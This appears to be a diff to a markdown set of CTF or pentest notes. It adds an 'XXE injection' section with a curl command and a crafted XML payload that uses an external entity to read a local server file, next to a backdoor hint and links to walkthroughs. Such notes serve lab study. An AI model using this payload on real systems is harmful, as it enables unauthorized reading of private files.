@@ -225,6 +225,26 @@ workshop under /kgbbackdoor folder you must have to use
 PassPass.jpg in order to get access.
 ```
 
+### XXE injection
+
+[Here](https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection) is more.
+
+```bash
+curl -d "@req.xml" -X POST -k https://172.25.1.130:15988/pool/process.php
+
+# The file "@req.xml"  containing this:
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///home/teo/server" >]>
+<root>
+  <name>sebi</name>
+  <tel></tel>
+  <email>&xxe;</email>
+  <password></password>
+</root>
+```
+
 ## WalkThroughs
 
  - [MrRobot](https://securitybytes.io/vulnhub-com-mr-robot-1-ctf-walkthrough-7d4800fc605a)
